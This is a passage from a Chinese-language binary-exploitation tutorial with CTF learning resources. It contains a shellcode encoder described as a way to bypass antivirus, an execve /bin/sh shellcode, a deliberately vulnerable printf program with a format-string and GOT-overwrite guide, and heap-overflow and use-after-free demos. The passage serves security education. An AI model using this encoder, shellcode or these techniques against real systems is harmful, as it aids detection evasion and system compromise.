
---

## 四、高级实战案例

### 4.1 自定义 Shellcode 编码器

编写自定义 Shellcode 编码器，用于绕过杀毒软件检测。

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// XOR 编码器
void xor_encode(unsigned char *shellcode, int len, unsigned char key) {
    for (int i = 0; i < len; i++) {
        shellcode[i] ^= key;
    }
}

// 加法递增编码器
void add_encode(unsigned char *shellcode, int len) {
    for (int i = 0; i < len; i++) {
        shellcode[i] = (shellcode[i] + i) & 0xFF;
    }
}

// 加法递减解码器
void add_decode(unsigned char *shellcode, int len) {
    for (int i = 0; i < len; i++) {
        shellcode[i] = (shellcode[i] - i) & 0xFF;
    }
}

// 打印 shellcode 格式
void print_shellcode(const unsigned char *sc, int len) {
    printf("unsigned char shellcode[] = \"");
    for (int i = 0; i < len; i++) {
        if (i > 0 && i % 16 == 0) printf("\"\\n    \"");
        printf("\\x%02x", sc[i]);
    }
    printf("\";\\n");
    printf("长度: %d 字节\\n", len);
}

// 检测坏字符
void detect_badchars(const unsigned char *sc, int len, const unsigned char *bad, int bad_len) {
    printf("坏字符检测结果:\\n");
    for (int i = 0; i < len; i++) {
        for (int j = 0; j < bad_len; j++) {
            if (sc[i] == bad[j]) {
                printf("  偏移 0x%04x: 0x%02x (坏字符)\\n", i, bad[j]);
            }
        }
    }
}

int main() {
    // 示例 shellcode (Linux x86 execve /bin/sh)
    unsigned char shellcode[] = 
        "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
        "\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80";
    int len = 25;
    
    printf("原始 shellcode:\\n");
    print_shellcode(shellcode, len);
    
    // XOR 编码
    unsigned char encoded[256];
    memcpy(encoded, shellcode, len);
    xor_encode(encoded, len, 0xAA);
    printf("\\nXOR 编码后 (key=0xAA):\\n");
    print_shellcode(encoded, len);
    
    // 坏字符检测
    unsigned char badchars[] = {0x00, 0x0a, 0x0d};
    detect_badchars(shellcode, len, badchars, 3);
    
    return 0;
}
```

### 4.2 格式化字符串漏洞利用

深入利用格式化字符串漏洞，实现任意读写。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 存在格式化字符串漏洞的程序
void vulnerable(char *input) {
    printf(input);  // 漏洞点！应该是 printf("%s", input)
}

int main(int argc, char *argv[]) {
    char buf[256];
    
    if (argc > 1) {
        strncpy(buf, argv[1], sizeof(buf)-1);
        vulnerable(buf);
    }
    
    return 0;
}

/*
===== 格式化字符串漏洞利用指南 =====

1. 读取栈上数据:
   ./vuln "%x.%x.%x.%x"
   ./vuln "%p.%p.%p.%p"

2. 读取指定位置:
   ./vuln "%5$x"  (读取第5个参数位置的值)
   ./vuln "%10$s" (读取第10个位置作为字符串)

3. 任意地址写入（%n）:
   - %n: 写入已输出字符数到指定地址
   - %hn: 写入 2 字节（short）
   - %hhn: 写入 1 字节（char）

4. 构造格式:
   [地址][填充]%[输出宽度]x%[位置]$n
   
   示例（4字节地址在第 N 个参数位置）:
   "\\x40\\x40\\x40\\x40%[width]x%N$n"

5. 改写 GOT 表:
   - 找到 printf 的 GOT 地址
   - 用 %n 改写为 system 的地址
   - 下次调用 printf 时执行 system
*/
```

### 4.3 堆溢出与 UAF 利用

深入堆利用技术，包括 unlink、fastbin attack、double free 等。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 模拟堆溢出场景
void heap_overflow_example() {
    printf("=== 堆溢出示例 ===\\n");
    
    char *buf1 = malloc(32);
    char *buf2 = malloc(32);
    
    printf("buf1: %p\\n", (void*)buf1);
    printf("buf2: %p\\n", (void*)buf2);
    
    strcpy(buf1, "Hello heap!");
    printf("buf1: %s\\n", buf1);
    
    // 堆溢出（覆盖下一个 chunk 的头部）
    memset(buf1, 'A', 32 + 16);
    
    free(buf2);
    free(buf1);
}

// Use-After-Free 示例
void uaf_example() {
    printf("\\n=== UAF 示例 ===\\n");
    
    char *buf = malloc(64);
    strcpy(buf, "sensitive data");
    printf("内容: %s\\n", buf);
    
    free(buf);  // 释放后未置空
    
    // UAF: 仍然使用已释放的内存
    printf("释放后读取: %s\\n", buf);
    
    // 再次分配可能获得同一块内存
    char *buf2 = malloc(64);
    strcpy(buf2, "new data");
    printf("buf 现在指向: %s\\n", buf);
    
    free(buf2);
}

int main() {
    heap_overflow_example();
    uaf_example();
    return 0;
}

/*
===== 堆利用技术总结 =====

基础概念:
- chunk: malloc 分配的内存块（包含用户数据和元数据）
- bin: 空闲 chunk 的链表
  - fastbin: 小内存快速分配（单链表）
  - unsorted bin: 刚释放的大内存（双链表）
  - smallbin / largebin: 不同大小分类

常见利用技术:

1. Unlink Attack (旧版本 glibc)
   - 利用堆溢出覆盖下个 chunk 的头部
   - 伪造一个空闲 chunk
   - free 时触发 unlink 实现任意地址写

2. Fastbin Attack (glibc < 2.29)
   - double free fastbin chunk
   - 修改 fd 指针指向目标地址
   - 下次分配获得目标地址的内存

3. House of Spirit
   - 在可控区域伪造 fastbin chunk
   - 释放伪造 chunk 到 fastbin
   - 分配时获得伪造地址的内存

4. Use-After-Free
   - 释放后继续使用
   - 如果内容可控，可篡改虚函数表等

5. Tcache Attack (glibc >= 2.27)
   - tcache 是每个线程的缓存
   - tcache poisoning 可实现任意地址写

防护机制:
- Ptmalloc2 的各种 sanity checks
- ASLR（堆地址随机化）
- RELRO（GOT 表保护）
*/
```

---

## 五、进阶学习资源

### 5.1 CTF Pwn 学习资源

- **pwn.college**：https://pwn.college/ — Arizona 大学 PWN 课程
- **Nightmare**：https://guyinatuxedo.github.io/ — 二进制安全入门教程
- **ROP Emporium**：https://ropemporium.com/ — ROP 技术练习
- **pwnable.kr**：https://pwnable.kr/ — PWN 挑战题
- **pwnable.tw**：https://pwnable.tw/ — PWN 挑战题
- **Exploit Education**：https://exploit.education/ — 漏洞利用练习环境
- **How2Heap**：https://github.com/shellphish/how2heap — 堆利用技术大全

### 5.2 逆向工程资源

- **Reverse Engineering for Beginners**：https://beginners.re/ — 逆向入门经典
- **Crackmes.one**：https://crackmes.one/ — Crackme 练习平台
- ** reversing.kr**：http://reversing.kr/ — 逆向挑战
- **《IDA Pro 权威指南》** — IDA 使用圣经
- **《加密与解密》** — 国内逆向经典

### 5.3 Shellcode 开发

- **Shell-Storm**：http://shell-storm.org/shellcode/ — Shellcode 数据库
- **Exploit-DB Shellcodes**：https://www.exploit-db.com/shellcodes
- **pwntools shellcraft**：Python 生成 shellcode 的模块

### 5.4 工具链

- **GDB + pwndbg/GEF**：调试器增强插件
  - pwndbg: https://github.com/pwndbg/pwndbg
  - GEF: https://github.com/hugsy/gef
- **IDA Pro / Ghidra**：反汇编与反编译
  - Ghidra: https://ghidra-sre.org/ （NSA 开源）
- **Radare2 / Cutter**：开源逆向框架
- **one_gadget**：查找 execve("/bin/sh") gadget
- **ROPgadget**：查找 ROP gadgets
- **angr**：符号执行框架

### 5.5 推荐进阶书籍

- **漏洞利用**：
  - 《0day 安全：软件漏洞分析技术》
  - 《漏洞战争：软件漏洞分析精要》
  - 《The Shellcoder's Handbook》
  - 《Hacking: The Art of Exploitation》

- **逆向工程**：
  - 《IDA Pro 权威指南》
  - 《加密与解密》（第四版）
  - 《逆向工程核心原理》

- **系统底层**：
  - 《深入理解计算机系统》（CSAPP）
  - 《程序员的自我修养：链接、装载与库》

### 5.6 堆利用进阶路线

**第 1 阶段：基础（1-2月）**
- 理解 glibc malloc 的基本原理
- 掌握 chunk 结构、bin 分类
- 学习使用 gdb 调试堆

**第 2 阶段：入门（2-3月）**
- 栈溢出：ret2text / ret2shellcode / ret2libc / ROP
- 格式化字符串漏洞
- 基础堆溢出

**第 3 阶段：进阶（3-4月）**
- fastbin attack
- unlink
- Use-After-Free
- House of Spirit / Force

**第 4 阶段：高级（持续）**
- tcache 系列攻击
- large bin attack
- unsorted bin attack
- 各种 House of XXX 技术

**第 5 阶段：实战（持续）**
- CTF Pwn 题练习
- 真实漏洞复现（CVE）
- 各种保护绕过（PIE / RELRO / Canary / NX）

### 5.7 社区与博客

- **看雪学院**：https://www.kanxue.com/
- **吾爱破解**：https://www.52pojie.cn/
- **T00ls**：https://www.t00ls.net/
- **安全客二进制**：https://www.anquanke.com/vul
- **exploit-db**：https://www.exploit-db.com/
- **packet storm**：https://packetstormsecurity.com/
